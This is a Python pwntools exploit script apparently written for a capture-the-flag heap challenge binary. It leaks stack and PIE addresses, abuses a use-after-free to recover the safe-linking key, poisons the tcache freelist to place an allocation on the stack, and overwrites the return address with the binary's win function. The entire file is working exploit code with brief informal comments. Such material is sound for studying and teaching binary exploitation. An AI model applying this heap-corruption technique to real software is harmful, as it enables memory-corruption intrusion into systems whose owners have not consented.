#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/sus-sequence-safety-easy")

def get_leak(io):
    data = io.recvuntil(b"[*]").decode()
    print(data)
    stack_leak = int(re.findall(r"0x[a-f\d]+",data)[0],16)
    pie_leak = int(re.findall(r"0x[a-f\d]+",data)[1],16)
    print(stack_leak,pie_leak)
    return io,stack_leak,pie_leak

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def read(io,index,size):
    payload = b"read " + str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def xor_num(n1,n2):
    return n1 ^ n2

def main():
    rbp = 0x7ff123123123
    ret = rbp + 0x8
    canary = rbp - 8
    input_ptr_add = rbp - 0x120
    offset = ret - input_ptr_add
    io = process()
    io,stack,pie = get_leak(io)
    elf.address = pie - elf.sym.main
    io = malloc(io,15,24)
    io = malloc(io,0,24)
    io = malloc(io,1,24)
    io = free(io,0)
    io = puts(io,0)
    print(io.recvuntil(b"Data: ").decode())
    key = int.from_bytes(io.recvline()[:-1],"little")
    print(hex(key))

    io = free(io,1)
    io = scanf(io,1,p64(xor_num(stack,key))) # here i put the starting of the pointer which is save when we do malloc 0 index ptr sore and that stack
    io = malloc(io,2,24)
    io = malloc(io,3,24)
    
    io = scanf(io,3,p64(stack+offset)) # here i write the starting of the ptr to rbp + 8 .thus the index 0 poiint to ret add
    io = scanf(io,0,p64(elf.sym.win)) # then i write the win address using that 0 index ptr
    io = quit(io)
    io.interactive()

if __name__ == "__main__":
    main()
